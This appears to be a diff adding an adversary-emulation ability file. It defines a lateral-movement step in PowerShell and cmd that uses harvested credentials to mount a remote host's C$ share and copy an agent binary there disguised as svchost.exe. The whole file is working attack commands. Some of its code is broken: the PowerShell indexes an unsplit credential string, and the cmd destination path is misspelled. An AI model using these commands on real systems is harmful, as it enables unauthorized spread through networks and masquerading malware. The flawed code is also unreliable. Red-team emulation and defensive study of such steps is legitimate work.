@@ -1,0 +1,31 @@
+---
+
+- id: c5e75d70-09ae-469f-8717-621a1b7ef946
+  name: Copy 54ndc47 (SMB)
+  description: Copy 54ndc47 to remote host (SMB)
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  platforms:
+    windows:
+      psh:
+        command: |
+          $split = "#{remote.host.credentials}";
+          $username = $split[2];
+          $password = $split[3];
+          $secstr = New-Object -TypeName System.Security.SecureString;
+          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+          $path = $env:USERPROFILE+"\sandcat.go-windows";
+          $drive = "#{remote.host.ip}".replace(".","_");
+          New-PSDrive -Name $drive -PSProvider FileSystem -Root "\\$split[0]\C$" -Credential $cred;
+          Copy-Item -Path $path -Destination $drive":\Users\Public\svchost.exe";
+        payload: sandcat.go-windows
+      cmd:
+        command: |
+          for /f "tokens=1-4 delims=: " %A in ("#{remote.host.credentials}") do @(set ip=%A && set port=%B && set user=%C && set pw=%D) &&
+          net use \\%ip%\c$ /user:%user% %pw% /persistent:no & 
+          copy /B /Y sandcat.go-windows \\%ip%\c$\Users\Pubic\svchost.exe
+        payload: sandcat.go-windows
+
